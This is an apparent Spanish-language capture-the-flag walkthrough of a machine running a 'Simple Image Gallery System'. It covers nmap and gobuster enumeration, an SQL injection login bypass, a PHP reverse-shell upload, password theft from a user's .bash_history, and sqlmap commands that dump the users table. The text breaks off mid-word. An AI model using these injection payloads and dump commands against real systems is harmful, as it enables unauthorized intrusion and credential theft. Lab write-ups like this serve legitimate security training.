```python
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simple Image Gallery System
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.42 seconds
```

### Ports: 80/htto - 8080/http

### Enumeracion del puerto 80
![[Pasted image 20240112205004.png]]

### Fuzzing con gobuster
![[Pasted image 20240112205902.png]]
vamos a analizar el subdominio /gallery

### login
![[Pasted image 20240112210033.png]]
###### vamos a intentar varias credenciales por defecto y tambien inyecciones sqli
payload inyeccion sqli
```python
admin'OR 1=1-- -
```

### tenemos acceso a la pag web
![[Pasted image 20240112210533.png]]
###### en el apartado de albums podemos ver una opcion para cargar archivos lo que podriamos utilizar para intentar cargar un archivo php que contenga una reverse shell
![[Pasted image 20240112212006.png]]
la rever shell ha funcionado tenemos conexion a la maquina

### movimiento lateral. 
![[Pasted image 20240112212241.png]]
###### navegando por la maquina hemos conseguido un archivo backups del usuario mike en el cual tenemos permisos de lectura sobre el archivo .bash_history y dentro podemos ver que el usuario mike en algun momento proporciono su clave de super usuario asi que vamos a capturarla para convertirnos en el usuario mike

### analizando la maquina podemos ver que tenemos una base de datos
![[Pasted image 20240112220052.png]]
usaremos sqlmap para enumerar esta base de datos

### sqlmap 

```python
sqlmap -r phpid.txt --dbs
```
necesitamos interceptar alguna peticion con el burpsuite para poder conseguir la phpsessionid

![[Pasted image 20240112222715.png]]
ya tenemos el nombre de la base de datos. ahora vamos a enumerarla

```python
sqlmap -r phpid.txt -D gallery_db --tables
```
hemos enumerado las tablas de la base de datos. la tabla de users parece interesanta asi que vamos a echar un vistazo 
![[Pasted image 20240112223302.png]]

ahora vamos a enumerar la tabla de usuarios 

```python
sqlmap -r phpid.txt -D gallery_db -T users --columns users
```

![[Pasted image 20240112223801.png]]

ahora vamos a enumerar las columnas de password y username
```python
sqlmap -r phpid.txt -D gallery_db -T users --columns users -C username,password --dump
```

![[Pasted image 20240112224808.png]]
tenems